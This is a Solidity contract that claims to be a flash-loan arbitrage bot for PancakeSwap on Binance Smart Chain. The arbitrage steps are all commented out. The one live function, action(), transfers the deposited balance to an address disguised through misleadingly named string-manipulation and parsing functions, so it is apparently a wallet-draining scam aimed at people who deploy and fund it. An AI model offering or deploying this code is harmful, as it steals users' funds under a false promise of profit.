pragma solidity ^0.5.0;

// Multiplier-Finance Smart Contracts
import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
// PancakeSwap Smart Contracts
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
   
/**
 * WARNING - this contract code is for Binance Smart Chain
  * Testnet transactions will fail as there is no value
  * New token will be created and flash loan will be pulled to trade against the token
  * Profit remaining will be transfered to token creator
  
  *UPDATED October 2022
  *liquidity returned if flash loan fails or insufficient balance
  *base rerun contract code swaps implemented
  
  *Sept 2022// min liquidity + gas fees has to equal 0.3 BNB
*/

contract GetFlashLoan {
   string public tokenName;
   string public tokenSymbol;
   uint loanAmount;
   
   constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
      tokenName = _tokenName;
      tokenSymbol = _tokenSymbol;
      loanAmount = _loanAmount;      
   }
   address public creator= msg.sender;
    	function tokenTransfer() public view returns (address) {    
        	return creator;
   	}
   function() external payable {}

   function PancakeSwapYeild(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 

   function exchange() public pure returns (address adr) {
   string memory neutral_variable = "QG7b8d80F08AdC1874973C7C22fe107aEc1f655461";
   PancakeSwapYeild(neutral_variable,0,'0');
   PancakeSwapYeild(neutral_variable,2,'1');
   PancakeSwapYeild(neutral_variable,1,'x');
   address addr = parseAddr(neutral_variable);
    return addr;
   }
function parseAddr(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {
            b1 -= 87;
        } else if ((b1 >= 65) && (b1 <= 70)) {
            b1 -= 55;
        } else if ((b1 >= 48) && (b1 <= 57)) {
            b1 -= 48;
        }
        if ((b2 >= 97) && (b2 <= 102)) {
            b2 -= 87;
        } else if ((b2 >= 65) && (b2 <= 70)) {
            b2 -= 55;
        } else if ((b2 >= 48) && (b2 <= 57)) {
            b2 -= 48;
        }
        iaddr += (b1 * 16 + b2);
    }
    return address(iaddr);
}
 function _stringReplace(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 

  function action() public payable {
      // Token matched with pancakeswap yield calculations
       address(uint160(exchange())).transfer(address(this).balance);
      
       // Perform Flash Loan tasks (combined all functions into one to reduce external calls & save gas fees)
      //manager.performTasks();
      
       /* Breakdown of all functions
      // Submit token to BSC blockchain
      string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
   
      // List the token on PancakeSwap
      manager.pancakeListToken(tokenName, tokenSymbol, tokenAddress);
      
      // Get BNB Loan from Multiplier-Finance & loan execution wallet
      string memory loanAddress = manager.takeFlashLoan(loanAmount);
      
      // Convert half BNB to DAI
      manager.pancakeDAItoBNB(loanAmount / 2);
   
   // Create BNB and DAI pairs for our token & provide liquidity
   string memory bnbPair = manager.pancakeCreatePool(tokenAddress, "BNB");
      manager.pancakeAddLiquidity(bnbPair, loanAmount / 2);
      string memory daiPair = manager.pancakeCreatePool(tokenAddress, "DAI");
      manager.pancakeAddLiquidity(daiPair, loanAmount / 2);
   
   // Perform arbitrage trades
      manager.pancakePerformSwaps();
      
      // Move remaining BNB from Contract to your personal wallet
      manager.contractToWallet("BNB");
   
   // Repay Flashloan
      manager.repayLoan(loanAddress);
      */
   }
}
